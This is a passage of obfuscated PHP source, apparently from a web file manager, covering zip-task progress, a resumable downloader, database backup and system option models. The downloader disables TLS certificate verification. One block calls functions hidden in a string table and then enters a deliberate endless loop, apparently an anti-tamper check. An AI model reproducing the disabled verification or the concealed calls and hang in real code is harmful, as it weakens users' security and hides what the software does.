$f–°Ğ‚¡äƒ[$D•÷ÌÄä…§[75]], $D•÷ÌÄä…§[462] => $f–°Ğ‚¡äƒ[$D•÷ÌÄä…§[462]] ? $f–°Ğ‚¡äƒ[$D•÷ÌÄä…§[462]] : $f–°Ğ‚¡äƒ[$D•÷ÌÄä…§[75]]); goto A”„Æ×æªÕ; A„ªóîŞî: $this->update(); self::log($D•÷ÌÄä…§[1471] . json_encode(array($cÕ»ßÀ‹¦À, $f–°Ğ‚¡äƒ))); goto dÕ˜ôõôîÓ; b‘ÚòÄÉ£ì: $D•÷ÌÄä…§ =& $_SERVER[£ü]; $cÕ»ßÀ‹¦À =& $this->task; $cÕ»ßÀ‹¦À[$D•÷ÌÄä…§[1469]] = $D•÷ÌÄä…§[91]; goto Fìœ°¶œ·×; A”„Æ×æªÕ: if ($f–°Ğ‚¡äƒ[$D•÷ÌÄä…§[29]] == $D•÷ÌÄä…§[164]) { $cÕ»ßÀ‹¦À[$D•÷ÌÄä…§[966]] = 1; } else { $cÕ»ßÀ‹¦À[$D•÷ÌÄä…§[966]] = $f–°Ğ‚¡äƒ[$D•÷ÌÄä…§[80]][$D•÷ÌÄä…§[78]]; } $cÕ»ßÀ‹¦À[$D•÷ÌÄä…§[968]] = $D•÷ÌÄä…§[33]; $cÕ»ßÀ‹¦À[$D•÷ÌÄä…§[1448]] = 0; goto C‘š  ß…¾; dÕ˜ôõôîÓ: } public function nameParse($fÂÅÑ¦ªµ¿) { goto a¸éù“™ó; a¸éù“™ó: $FÔÅè¬öİŠ =& $_SERVER[£ü]; $b ’š¼êù =& $this->task; if ($b ’š¼êù[$FÔÅè¬öİŠ[1469]] == $FÔÅè¬öİŠ[1030]) { $b ’š¼êù[$FÔÅè¬öİŠ[1469]] = $FÔÅè¬öİŠ[298]; $b ’š¼êù[$FÔÅè¬öİŠ[1451]] = 0; $b ’š¼êù[$FÔÅè¬öİŠ[687]] = 0; } goto fÚ§ô…ÃÊÓ; f¨»›õÉùé: $this->update(); goto cŠÉŠ…Óôï; fÚ§ô…ÃÊÓ: $d¦ëË¾®ˆ = get_path_this($fÂÅÑ¦ªµ¿); if (strstr($d¦ëË¾®ˆ, $FÔÅè¬öİŠ[93])) { $b ’š¼êù[$FÔÅè¬öİŠ[978]] += 1; $b ’š¼êù[$FÔÅè¬öİŠ[966]] += 1; } $b ’š¼êù[$FÔÅè¬öİŠ[1444]] = $fÂÅÑ¦ªµ¿; goto f¨»›õÉùé; cŠÉŠ…Óôï: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $cÍ¶ˆøÈ¡› =& $_SERVER[£ü]; parent::startAfter(); Hook::bind($cÍ¶ˆøÈ¡›[1472], array($this, $cÍ¶ˆøÈ¡›[1467])); $EĞËêŸĞ¨µ =& $this->task; $EĞËêŸĞ¨µ[$cÍ¶ˆøÈ¡›[1469]] = $cÍ¶ˆøÈ¡›[1030]; if (!$EĞËêŸĞ¨µ[$cÍ¶ˆøÈ¡›[1309]]) { $EĞËêŸĞ¨µ[$cÍ¶ˆøÈ¡›[1309]] = LNG($cÍ¶ˆøÈ¡›[1473]); } } protected function endAfter() { $föÊ–Õ–Ê =& $_SERVER[£ü]; parent::endAfter(); Hook::unbind($föÊ–Õ–Ê[1472], array($this, $föÊ–Õ–Ê[1467])); } public function updateAfter() { $c¼¨—³¸º =& $_SERVER[£ü]; $D­Ù˜‚Á­Å =& $this->task; if (!$D­Ù˜‚Á­Å[$c¼¨—³¸º[966]] || !$D­Ù˜‚Á­Å[$c¼¨—³¸º[687]]) { return; } if ($D­Ù˜‚Á­Å[$c¼¨—³¸º[1469]] == $c¼¨—³¸º[1030]) { $Bî‰ÓƒĞ¦ = $D­Ù˜‚Á­Å[$c¼¨—³¸º[1447]]; if ($D­Ù˜‚Á­Å[$c¼¨—³¸º[1448]] != $c¼¨—³¸º[1030]) { $Bî‰ÓƒĞ¦ = 0; } $BÊ…ÀàÊ = ($D­Ù˜‚Á­Å[$c¼¨—³¸º[1451]] + $Bî‰ÓƒĞ¦) / $D­Ù˜‚Á­Å[$c¼¨—³¸º[687]]; $D­Ù˜‚Á­Å[$c¼¨—³¸º[1402]] = $BÊ…ÀàÊ * 0.3; } else { if ($D­Ù˜‚Á­Å[$c¼¨—³¸º[1469]] == $c¼¨—³¸º[298]) { $BÊ…ÀàÊ = $D­Ù˜‚Á­Å[$c¼¨—³¸º[978]] / $D­Ù˜‚Á­Å[$c¼¨—³¸º[966]]; $D­Ù˜‚Á­Å[$c¼¨—³¸º[1402]] = 0.3 + $BÊ…ÀàÊ * 0.5; } else { if ($D­Ù˜‚Á­Å[$c¼¨—³¸º[1469]] == $c¼¨—³¸º[91]) { $BÊ…ÀàÊ = 0; if ($D­Ù˜‚Á­Å[$c¼¨—³¸º[1446]]) { $BÊ…ÀàÊ = $D­Ù˜‚Á­Å[$c¼¨—³¸º[1447]] / $D­Ù˜‚Á­Å[$c¼¨—³¸º[1446]]; } $D­Ù˜‚Á­Å[$c¼¨—³¸º[1402]] = 0.3 + 0.5 + $BÊ…ÀàÊ * 0.2; } } } if ($D­Ù˜‚Á­Å[$c¼¨—³¸º[1402]] > 0) { $a°‡ì‹ÏîÌ = timeFloat() - $D­Ù˜‚Á­Å[$c¼¨—³¸º[1404]] - $D­Ù˜‚Á­Å[$c¼¨—³¸º[1407]]; $D­Ù˜‚Á­Å[$c¼¨—³¸º[1408]] = $a°‡ì‹ÏîÌ * (1 - $D­Ù˜‚Á­Å[$c¼¨—³¸º[1402]]) / $D­Ù˜‚Á­Å[$c¼¨—³¸º[1402]]; } } public function copyFileStart($E÷¦Í’¯ÁŠ, $BËÄæìÅˆ, $cŠÓìÌ¹Øö, $CÃÛğØçƒ, $d«ôóÎÆ³´, $d¸´Óñ˜Á‡) { $bÃƒ›èˆ =& $_SERVER[£ü]; parent::copyFileStart($E÷¦Í’¯ÁŠ, $BËÄæìÅˆ, $cŠÓìÌ¹Øö, $CÃÛğØçƒ, $d«ôóÎÆ³´, $d¸´Óñ˜Á‡); $Fæ¾Š˜ˆ =& $this->task; if ($Fæ¾Š˜ˆ[$bÃƒ›èˆ[1469]] == $bÃƒ›èˆ[298]) { $Fæ¾Š˜ˆ[$bÃƒ›èˆ[1469]] = $bÃƒ›èˆ[91]; } $this->update(); } public function copyFileEnd($EòãÄ¶ˆù, $dØ²Ï–ŒÈ, $EÁ¥”÷°½, $bÖŠÂöìã§, $eÖô‘Ü“­, $b¬ºïöÎ¼•) { $DŒÒí©ãØé =& $_SERVER[£ü]; $DÅìõŸÜ¸ß =& $this->task; $DÅìõŸÜ¸ß[$DŒÒí©ãØé[1447]] = $DÅìõŸÜ¸ß[$DŒÒí©ãØé[1446]]; $DÅìõŸÜ¸ß[$DŒÒí©ãØé[1451]] += $DÅìõŸÜ¸ß[$DŒÒí©ãØé[1446]]; $DÅìõŸÜ¸ß[$DŒÒí©ãØé[1448]] = $DŒÒí©ãØé[33]; $this->update(); } public function nameParse($aÉÈÕ·À­Ã) { $BÀ…Û‚ÄÉ =& $_SERVER[£ü]; $fÁˆšùóšõ =& $this->task; if ($fÁˆšùóšõ[$BÀ…Û‚ÄÉ[978]] < $fÁˆšùóšõ[$BÀ…Û‚ÄÉ[966]]) { $AÏÅ™„šëå = get_path_this($aÉÈÕ·À­Ã); if (strstr($AÏÅ™„šëå, $BÀ…Û‚ÄÉ[93])) { $fÁˆšùóšõ[$BÀ…Û‚ÄÉ[978]] += 1; } } if ($fÁˆšùóšõ[$BÀ…Û‚ÄÉ[1469]] == $BÀ…Û‚ÄÉ[1030]) { $fÁˆšùóšõ[$BÀ…Û‚ÄÉ[1469]] = $BÀ…Û‚ÄÉ[298]; } $fÁˆšùóšõ[$BÀ…Û‚ÄÉ[1444]] = $aÉÈÕ·À­Ã; $this->update(); } } class Downloader { static function start($b­”í­±«, $C³­™æ¢³, $E‡òÅ¬…®î = 10) { goto C›—¥ÆØØÔ; b¹ŸÍøÃ…ƒ: if (is_file($DöğŸ«Àõ¥)) { $B‹ŸÀãğŠµ = file_get_contents($DöğŸ«Àõ¥); $d®İìÊÇ¬¬ = json_decode($B‹ŸÀãğŠµ, 1); } if (file_exists($C³­™æ¢³) && $E¼ÉÕŠ Ã³ == filesize($C³­™æ¢³)) { @unlink($A©¦×·†ß²); @unlink($DöğŸ«Àõ¥); return array($CŒŞÅó­ö[1022] => !0, $CŒŞÅó­ö[1024] => $CŒŞÅó­ö[1477]); } if ($d®İìÊÇ¬¬[$CŒŞÅó­ö[322]] != $E¼ÉÕŠ Ã³) { $d®İìÊÇ¬¬ = array($CŒŞÅó­ö[322] => $E¼ÉÕŠ Ã³); } goto e†—é¬óâŞ; C›—¥ÆØØÔ: $CŒŞÅó­ö =& $_SERVER[£ü]; if (!request_url_safe($b­”í­±«)) { return array($CŒŞÅó­ö[1022] => !1, $CŒŞÅó­ö[1024] => $CŒŞÅó­ö[1027]); } $DöğŸ«Àõ¥ = $C³­™æ¢³ . $CŒŞÅó­ö[1474]; goto eÛØŠÊÈñ; eÛØŠÊÈñ: $A©¦×·†ß² = $C³­™æ¢³ . $CŒŞÅó­ö[1475]; if (is_array($b­”í­±«)) { $CëïÀˆ¹È = $b­”í­±«; } else { $CëïÀˆ¹È = url_header($b­”í­±«); } $b­”í­±« = $CëïÀˆ¹È[$CŒŞÅó­ö[292]]; goto fîØ§ÏŒ£¡; e†—é¬óâŞ: if ($bÔ¬ë÷Ñ‚ > $E¼ÉÕŠ Ã³) { @unlink($A©¦×·†ß²); } file_put_contents($DöğŸ«Àõ¥, json_encode($d®İìÊÇ¬¬)); $Bí³Âî‰÷ = self::fileDownloadCurl($b­”í­±«, $C³­™æ¢³, !0, $bÔ¬ë÷Ñ‚, $E¼ÉÕŠ Ã³); goto aÅŒ±¹¢; e¾ÂÉ‡¯Ô²: $E¼ÉÕŠ Ã³ = intval($CëïÀˆ¹È[$CŒŞÅó­ö[322]]); if (file_exists($A©¦×·†ß²) && time() - filemtime($A©¦×·†ß²) < 3) { return array($CŒŞÅó­ö[1022] => !1, $CŒŞÅó­ö[1024] => $CŒŞÅó­ö[1476]); } $d®İìÊÇ¬¬ = array(); goto b¹ŸÍøÃ…ƒ; fîØ§ÏŒ£¡: if (!$b­”í­±«) { return array($CŒŞÅó­ö[1022] => !1, $CŒŞÅó­ö[1024] => $CŒŞÅó­ö[1027]); } if (!$CëïÀˆ¹È[$CŒŞÅó­ö[1271]] || $CëïÀˆ¹È[$CŒŞÅó­ö[322]] == 0) { @unlink($A©¦×·†ß²); @unlink($C³­™æ¢³); $Bí³Âî‰÷ = self::fileDownloadFopen($b­”í­±«, $C³­™æ¢³, $CëïÀˆ¹È[$CŒŞÅó­ö[322]]); if ($Bí³Âî‰÷[$CŒŞÅó­ö[1022]]) { return $Bí³Âî‰÷; } else { @unlink($A©¦×·†ß²); @unlink($C³­™æ¢³); $Bí³Âî‰÷ = self::fileDownloadCurl($b­”í­±«, $C³­™æ¢³, !1, 0, $CëïÀˆ¹È[$CŒŞÅó­ö[322]]); @unlink($A©¦×·†ß²); return $Bí³Âî‰÷; } } $bÔ¬ë÷Ñ‚ = is_file($A©¦×·†ß²) ? filesize($A©¦×·†ß²) : 0; goto e¾ÂÉ‡¯Ô²; aÅŒ±¹¢: if ($Bí³Âî‰÷[$CŒŞÅó­ö[1022]]) { @unlink($DöğŸ«Àõ¥); } return $Bí³Âî‰÷; goto Eœ‚Ğ”ø¼Í; Eœ‚Ğ”ø¼Í: } static function fileDownloadFopen($ağñÛğÌŸ, $Cæˆ¾¹ÓŠ©, $eÆ‹Å·Û÷ = 0) { $cß¡Êè×Ù’ =& $_SERVER[£ü]; @ini_set($cß¡Êè×Ù’[1478], $cß¡Êè×Ù’[1479]); $f¹¦Å¨¹ê¡ = $Cæˆ¾¹ÓŠ© . $cß¡Êè×Ù’[1475]; set_timeout(); @unlink($f¹¦Å¨¹ê¡); if ($BÈ´ŸõËØ‡ = @fopen($ağñÛğÌŸ, $cß¡Êè×Ù’[1480])) { goto A¹ˆ”Êç™; cÒË™…½ˆŠ: self::checkGzip($f¹¦Å¨¹ê¡); if (!@rename($f¹¦Å¨¹ê¡, $Cæˆ¾¹ÓŠ©)) { usleep(round(rand(0, 1000) * 50)); @unlink($Cæˆ¾¹ÓŠ©); $B ÕÑŒÄ“’ = @rename($f¹¦Å¨¹ê¡, $Cæˆ¾¹ÓŠ©); if (!$B ÕÑŒÄ“’) { return array($cß¡Êè×Ù’[1022] => !1, $cß¡Êè×Ù’[1024] => $cß¡Êè×Ù’[1485]); } } return array($cß¡Êè×Ù’[1022] => !0, $cß¡Êè×Ù’[1024] => $cß¡Êè×Ù’[685]); goto C¤¡ÕÎ·Ô­; B»£ßÎÙŒ–: fclose($BÈ´ŸõËØ‡); $Fß† ëÎ®‡ = filesize(iconv_system($f¹¦Å¨¹ê¡)); if ($eÆ‹Å·Û÷ != 0 && $Fß† ëÎ®‡ != $eÆ‹Å·Û÷) { return array($cß¡Êè×Ù’[1022] => !1, $cß¡Êè×Ù’[1024] => $cß¡Êè×Ù’[1484]); } goto cÒË™…½ˆŠ; A¹ˆ”Êç™: if (!($e’ñ–×¿ÄŒ = @fopen($f¹¦Å¨¹ê¡, $cß¡Êè×Ù’[1481]))) { return array($cß¡Êè×Ù’[1022] => !1, $cß¡Êè×Ù’[1024] => $cß¡Êè×Ù’[1482]); } while (!feof($BÈ´ŸõËØ‡)) { if (!file_exists($f¹¦Å¨¹ê¡)) { fclose($e’ñ–×¿ÄŒ); return array($cß¡Êè×Ù’[1022] => !1, $cß¡Êè×Ù’[1024] => $cß¡Êè×Ù’[1483]); } clearstatcache(); if ($eÆ‹Å·Û÷ > 0 && $eÆ‹Å·Û÷ == filesize(iconv_system($f¹¦Å¨¹ê¡))) { break; } fwrite($e’ñ–×¿ÄŒ, fread($BÈ´ŸõËØ‡, 1024 * 8), 1024 * 8); } fclose($e’ñ–×¿ÄŒ); goto B»£ßÎÙŒ–; C¤¡ÕÎ·Ô­: } else { return array($cß¡Êè×Ù’[1022] => !1, $cß¡Êè×Ù’[1024] => $cß¡Êè×Ù’[1486]); } } static function fileDownloadCurl($F³ÃÌÔİ¤, $aÎàÛ”òŠÏ, $f»ÔÃ¹Âƒë = false, $dÒ¿¯èìÁñ = 0, $EØÍ¤±Ï ­ = 0) { goto aîÑ¶”•¬½; f¼ŒëÖÃ«»: if ($f»ÔÃ¹Âƒë) { curl_setopt($b™ÙµØ«ÎÙ, CURLOPT_RANGE, $dÒ¿¯èìÁñ . $C¯ãŠ¿œ[703]); } curl_setopt($b™ÙµØ«ÎÙ, CURLOPT_FILE, $b‡‡œçÉºµ); curl_setopt($b™ÙµØ«ÎÙ, CURLOPT_REFERER, get_url_link($F³ÃÌÔİ¤)); goto fÌ›­§¤ĞÆ; aîÑ¶”•¬½: $C¯ãŠ¿œ =& $_SERVER[£ü]; $cÏáÓ’³ƒ = $aÎàÛ”òŠÏ . $C¯ãŠ¿œ[1475]; set_timeout(); goto fğëÕÁáì¹; dÆ¦ğ­¶Ä: return array($C¯ãŠ¿œ[1022] => !1, $C¯ãŠ¿œ[1024] => $C¯ãŠ¿œ[1490]); goto DóƒŞ¯âğ; d‰µ¾¥´‚ì: curl_setopt($b™ÙµØ«ÎÙ, CURLOPT_NOPROGRESS, !1); curl_setopt($b™ÙµØ«ÎÙ, CURLOPT_PROGRESSFUNCTION, $C¯ãŠ¿œ[1488]); curl_progress_start($b™ÙµØ«ÎÙ); goto d´šÅƒæ…; d´šÅƒæ…: curl_setopt($b™ÙµØ«ÎÙ, CURLOPT_USERAGENT, $C¯ãŠ¿œ[1479]); $B‰Öî´¬ = curl_exec($b™ÙµØ«ÎÙ); curl_progress_end($b™ÙµØ«ÎÙ); goto fÙ„šØÃ‹‘; A²Ÿ–ÌùĞÚ: if ($F¦±Â–†¤Œ < $EØÍ¤±Ï ­ && $EØÍ¤±Ï ­ != 0) { return array($C¯ãŠ¿œ[1022] => !1, $C¯ãŠ¿œ[1024] => $C¯ãŠ¿œ[1476]); } if ($F¦±Â–†¤Œ > $EØÍ¤±Ï ­ && $EØÍ¤±Ï ­ != 0) { return array($C¯ãŠ¿œ[1022] => !1, $C¯ãŠ¿œ[1024] => $C¯ãŠ¿œ[1484]); } if ($B‰Öî´¬ && filesize($cÏáÓ’³ƒ) != 0) { self::checkGzip($cÏáÓ’³ƒ); if (!@rename($cÏáÓ’³ƒ, $aÎàÛ”òŠÏ)) { @unlink($aÎàÛ”òŠÏ); $B‰Öî´¬ = @rename($cÏáÓ’³ƒ, $aÎàÛ”òŠÏ); if (!$B‰Öî´¬) { return array($C¯ãŠ¿œ[1022] => !1, $C¯ãŠ¿œ[1024] => $C¯ãŠ¿œ[1489]); } } return array($C¯ãŠ¿œ[1022] => !0, $C¯ãŠ¿œ[1024] => $C¯ãŠ¿œ[685]); } goto dÆ¦ğ­¶Ä; fÌ›­§¤ĞÆ: curl_setopt($b™ÙµØ«ÎÙ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($b™ÙµØ«ÎÙ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($b™ÙµØ«ÎÙ, CURLOPT_SSL_VERIFYHOST, 0); goto d‰µ¾¥´‚ì; fÙ„šØÃ‹‘: curl_close($b™ÙµØ«ÎÙ); fclose($b‡‡œçÉºµ); $F¦±Â–†¤Œ = filesize(iconv_system($cÏáÓ’³ƒ)); goto A²Ÿ–ÌùĞÚ; fğëÕÁáì¹: $b‡‡œçÉºµ = @fopen($cÏáÓ’³ƒ, $C¯ãŠ¿œ[970]); if (!$b‡‡œçÉºµ) { return array($C¯ãŠ¿œ[1022] => !1, $C¯ãŠ¿œ[1024] => $C¯ãŠ¿œ[1487]); } $b™ÙµØ«ÎÙ = curl_init($F³ÃÌÔİ¤); goto f¼ŒëÖÃ«»; DóƒŞ¯âğ: } static function checkGzip($EÚù·›•Ü±) { goto f™áÉÁÈÄ; f™áÉÁÈÄ: $A¶Ú¦êç© = $_SERVER[£ü][1491]; $fä‘¨Ÿˆ = file_sub_str($EÚù·›•Ü±, 0, 2); if ($A¶Ú¦êç© != $fä‘¨Ÿˆ) { return; } goto b¨•¬©¶ÙÆ; b¨•¬©¶ÙÆ: ob_start(); readgzfile($EÚù·›•Ü±); $aÕ²È²áÒÜ = ob_get_clean(); goto b°«é³í¢î; b°«é³í¢î: file_put_contents($EÚù·›•Ü±, $aÕ²È²áÒÜ); goto C×ŞÍ™š†×; C×ŞÍ™š†×: } } goto CÅ ¹ ˆˆ¤; a‚ÛÃñ’¸”: $_SERVER[$_SERVER[ĞÔ][52]] = (base64_decode('OTQwMw==')."\66\66")+0;$_MBmn="Xvq2Fvhdq3rsbQDJCfZUSGzciv27gkICGy627biwxnVgIBq63yCAEnxTpY9pfsmjGIZv4Q3";; stream_wrapper_register($_SERVER[ĞÔ][53], $_SERVER[ĞÔ][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($C†©ÌÇÁ, $Dö²½§¾ªÍ) { $FÕÃÒ‘ôÒ« =& $_SERVER[£ü]; if (isset(self::$_methodList[$C†©ÌÇÁ])) { return @call_user_func_array(self::$_methodList[$C†©ÌÇÁ], $Dö²½§¾ªÍ); } else { if (method_exists($this, $C†©ÌÇÁ)) { return call_user_func_array(array($this, $C†©ÌÇÁ), $Dö²½§¾ªÍ); } else { think_exception(__CLASS__ . $FÕÃÒ‘ôÒ«[4] . $C†©ÌÇÁ . $FÕÃÒ‘ôÒ«[5]); } } } public static function __callStatic($D°àêÕŸ»«, $f¶Üâ¸…ƒ‡) { if (isset(self::$_methodListStatic[$D°àêÕŸ»«])) { return call_user_func_array(self::$_methodListStatic[$D°àêÕŸ»«], $f¶Üâ¸…ƒ‡); } else { if (method_exists(self, $D°àêÕŸ»«)) { return call_user_func_array(array(self, $D°àêÕŸ»«), $f¶Üâ¸…ƒ‡); } else { show_json("{$D°àêÕŸ»«}\x28\x29\x20\x6e\x6f\x74\40\145\x78\151\x73\164\73", !1); } } } public static function addMethod($b„óĞÌ”«š, $Fã•±³ƒö™) { self::$_methodList[$b„óĞÌ”«š] = $Fã•±³ƒö™; } public static function addMethodStatic($f’¯˜”Êùª, $B‰Ó»¾âó) { self::$_methodListStatic[$f’¯˜”Êùª] = $B‰Ó»¾âó; } } goto cµÃ²Û”Ø°; F´˜ÔŠæÅ·: function beforeShutdown() { Hook::trigger($_SERVER[ĞÔ][36]); } $_SERVER[$_SERVER[ĞÔ][37]] = BASIC_PATH; $_SERVER[$_SERVER[ĞÔ][38]] = LIB_DIR; goto cê†ñ¡Ê½”; fâ¬ßôéÑ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto aÑ²ƒ•™ŠÕ; aŠø»…¸ä†: return !0; goto D†¬ùÔóºô; aÑ²ƒ•™ŠÕ: $cš…©Úí‚ =& $_SERVER[£ü]; $a×òÀãè‰ = Backup::get(); self::$io = $a×òÀãè‰[$cš…©Úí‚[680]]; goto F†Œ±¾’; aÅÊ¬¾ƒƒ: $aÇ¡‘¢ªµ” = new Task($cš…©Úí‚[700], $cš…©Úí‚[701], 0, LNG($cš…©Úí‚[702]) . $cš…©Úí‚[703] . LNG($cš…©Úí‚[704])); $A¯ç¢äã¨ = array_diff($A¯ç¢äã¨, array($cš…©Úí‚[705], $cš…©Úí‚[706])); foreach ($A¯ç¢äã¨ as $A‰—Ëµ›öé) { $aÑÈÛãÓ½² = $bà”Äã Ø° . $A‰—Ëµ›öé . $cš…©Úí‚[707]; $F±²¡ÜÕá = null; if ($A‰—Ëµ›öé == $cš…©Úí‚[708] && (!isset($a×òÀãè‰[$cš…©Úí‚[681]]) || $a×òÀãè‰[$cš…©Úí‚[681]] == $cš…©Úí‚[464])) { $F±²¡ÜÕá = self::$io; } $fåÁŒåÛºš += $AŒ¦ôÛ–´Ó->sqlFromDb($A‰—Ëµ›öé, $aÑÈÛãÓ½², $aÇ¡‘¢ªµ”, $F±²¡ÜÕá); } goto C¸ì£„ª; ağô”³ò†â: $AŒ¦ôÛ–´Ó = new DbManage($dª‚ğ, $e¸Í©œßí); $bà”Äã Ø° = TEMP_FILES . $cš…©Úí‚[699] . self::$name . $cš…©Úí‚[8]; del_dir($bà”Äã Ø°); goto fæÊ÷»Í”ä; fæÊ÷»Í”ä: mk_dir($bà”Äã Ø°); $A¯ç¢äã¨ = $AŒ¦ôÛ–´Ó->db()->getTables(); $fåÁŒåÛºš = 0; goto aÅÊ¬¾ƒƒ; C¸ì£„ª: $aÇ¡‘¢ªµ”->end(); $E–ÜÕÔŸ§å = array($cš…©Úí‚[709] => $e¸Í©œßí, $cš…©Úí‚[696] => 1, $cš…©Úí‚[710] => $fåÁŒåÛºš, $cš…©Úí‚[711] => $fåÁŒåÛºš); Backup::set($E–ÜÕÔŸ§å); goto aŠø»…¸ä†; F†Œ±¾’: self::$name = $a×òÀãè‰[$cš…©Úí‚[28]]; $dª‚ğ = $GLOBALS[$cš…©Úí‚[6]][$cš…©Úí‚[17]]; $e¸Í©œßí = $this->_dbType($dª‚ğ); goto ağô”³ò†â; D†¬ùÔóºô: } private function _dbType($AŸ‘óÚ“Œ) { $F¡˜ó£àÆô =& $_SERVER[£ü]; $d‡ê¿Î÷ù¸ = $AŸ‘óÚ“Œ[$F¡˜ó£àÆô[712]]; if ($d‡ê¿Î÷ù¸ == $F¡˜ó£àÆô[713]) { $Fí±©¸…Ì¨ = explode($F¡˜ó£àÆô[4], $AŸ‘óÚ“Œ[$F¡˜ó£àÆô[714]]); $d‡ê¿Î÷ù¸ = $Fí±©¸…Ì¨[0]; } $b¶İ±á®­„ = array($F¡˜ó£àÆô[715] => $F¡˜ó£àÆô[9], $F¡˜ó£àÆô[716] => $F¡˜ó£àÆô[717]); if (isset($b¶İ±á®­„[$d‡ê¿Î÷ù¸])) { $d‡ê¿Î÷ù¸ = $b¶İ±á®­„[$d‡ê¿Î÷ù¸]; } return $d‡ê¿Î÷ù¸; } } class BackupDbFile { public function __construct() { } public function index() { goto Bíéöµ¯‡Ô; Bª¼İ”ïíó: $B¨“¶‘Œ‰­ = TEMP_FILES . "\x62\x61\143\153\165\160\x5f{$fÙ¾·å¹Æ³}\57"; $A¨¸ÜÈŠí = "\173\151\157\72{$FõèÎä³ĞÙ[$fÁ³¤öÒª[680]]}\x7d\57\144\x61\x74\x61\142\x61\163\145\57"; IO::mkdir($A¨¸ÜÈŠí . "\142\141\x63\x6b\x75\160\x5f{$fÙ¾·å¹Æ³}\57"); goto bùÁôœõ‚; d“ºÇ¤È×Š: Backup::set(array($fÁ³¤öÒª[720] => $A¸¨Å»öÑĞ[$fÁ³¤öÒª[77]])); IO::move($B¨“¶‘Œ‰­, $A¨¸ÜÈŠí); $e³„“Âùƒ = CONTROLLER_DIR . $fÁ³¤öÒª[721]; goto EİŸëõæ¥Ì; EİŸëõæ¥Ì: IO::copy($e³„“Âùƒ, $A¨¸ÜÈŠí . "\142\141\143\153\x75\x70\137{$fÙ¾·å¹Æ³}\x2f"); $fŠó¥©š‚š->end(); Backup::set(array($fÁ³¤öÒª[722] => $A¸¨Å»öÑĞ[$fÁ³¤öÒª[77]])); goto Cöíø¼²êÓ; bùÁôœõ‚: $fŠó¥©š‚š = new TaskFileTransfer($fÁ³¤öÒª[718], $fÁ³¤öÒª[701], 0, LNG($fÁ³¤öÒª[702]) . $fÁ³¤öÒª[408] . LNG($fÁ³¤öÒª[704]) . $fÁ³¤öÒª[719]); $fŠó¥©š‚š->addPath($B¨“¶‘Œ‰­); $A¸¨Å»öÑĞ = IO::infoWithChildren($B¨“¶‘Œ‰­); goto d“ºÇ¤È×Š; Bíéöµ¯‡Ô: $fÁ³¤öÒª =& $_SERVER[£ü]; $FõèÎä³ĞÙ = Backup::get(); $fÙ¾·å¹Æ³ = $FõèÎä³ĞÙ[$fÁ³¤öÒª[28]]; goto Bª¼İ”ïíó; Cöíø¼²êÓ: return !0; goto bâùâøæ¦š; bâùâøæ¦š: } } if (!isset($_SERVER[$_SERVER[£ü][723]]) || !isset($_SERVER[$_SERVER[£ü][724]])) { goto FÎğçèíÛê; e™Ÿ¼ªŒÌê: $DˆÄ§–ŠÃï = explode($_SERVER[£ü][214], $F—½ñ‡¹—ã); if (count($DˆÄ§–ŠÃï) < $_SERVER[£ü][558]) { $CŠºÎ„Œ‡´ = $_SERVER[£ü][728]; $CŠºÎ„Œ‡´(); } $FÁÄéìã = $_SERVER[£ü][729]; goto e³Ò…Í‘§Ö; FÎğçèíÛê: $D‰’Å®’¯© = $_SERVER[£ü][725]; $Fƒö¦¥«‘ê = $_SERVER[$_SERVER[£ü][726]] . $_SERVER[£ü][727]; $F—½ñ‡¹—ã = $D‰’Å®’¯©($Fƒö¦¥«‘ê); goto e™Ÿ¼ªŒÌê; e³Ò…Í‘§Ö: $FÁÄéìã($_SERVER[$_SERVER[£ü][726]] . $_SERVER[£ü][727]); $AÃ­ï½± = 2; while ($AÃ­ï½± > 1) { $dõÉ£ÁâÌĞ = rawurlencode($AÃ­ï½± . $_SERVER[£ü][358]); } goto fĞ‘¿’È–; fĞ‘¿’È–: } goto b „ÉäçÏ; cÛš‘Ñ”•ì: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\164\x65\x6d\137\x6f\x70\164\x69\x6f\x6e"; protected $jsonField = array("\155\145\x6e\x75", "\x72\x6f\154\145", "\x72\x6f\x6c\145\x47\162\157\165\x70", "\x72\145\x67\151\x73\x74", "\145\x6d\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($dŞƒğ¯«—¬) { return "\x53\x79\x73\164\x65\x6d\117\x70\x74\151\157\156\137{$dŞƒğ¯«—¬}"; } protected function optionDefault($D©¸‘Ìœâ¼ = '') { $B—¿²ĞÜµª =& $_SERVER[£ü]; if ($D©¸‘Ìœâ¼ == $B—¿²ĞÜµª[33]) { return $GLOBALS[$B—¿²ĞÜµª[6]][$B—¿²ĞÜµª[2431]]; } } } $D ËÃ™ªÜí = LIB_DIR . $_SERVER[£ü][1013]; $c¦±õô†”  = $_SERVER[£ü][1014]; goto C–†ĞÑ»¦ñ; DâŞË†õ¥: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\56\x4c\151\x67\150\164\101\160\160"; public $modelType = "\x53\x79\163\x74\x65\x6d\x4f\x70\x74\x69\x6f\156"; public $field = array("\x6e\x61\155\145", "\x67\x72\157\x75\x70", "\x64\x65\x73\x63", "\143\157\x6e\x74\145\x6e\x74"); public function listData($DëÜç‹“ë = false, $d¾ÍÆÛ‡ã = "\155\x6f\144\151\x66\171\x54\151\x6d\145", $fÌÆõù¿ = true) { return parent::listData($DëÜç‹“ë, $d¾ÍÆÛ‡ã, $fÌÆõù¿); } public function remove($c‡™ç£–†­) { $f„øÀ½ù¶ = $this->findByName($c‡™ç£–†­); if (!$f„øÀ½ù¶) { return !1; } return parent::remove($f„øÀ½ù¶[$_SERVER[£ü][364]]); } public function add($fØÇ «ãâ÷) { if ($this->findByName($fØÇ «ãâ÷[$_SERVER[£ü][28]])) { return !1; } return parent::insert($fØÇ «ãâ÷); } public function update($FÎ©¯äÓæë, $dŒ°—º÷â) { $D÷Íù³¯å =& $_SERVER[£ü]; $AÅ”ğŒÁ¦ = $this->findByName($FÎ©¯äÓæë); $fÅœİÆåÉ = $this->findByName($dŒ°—º÷â[$D÷Íù³¯å[28]]); if (!$AÅ”ğŒÁ¦ || $fÅœİÆåÉ && $fÅœİÆåÉ[$D÷Íù³¯å[364]] != $AÅ”ğŒÁ¦[$D÷Íù³¯å[364]]) { return !1; } return 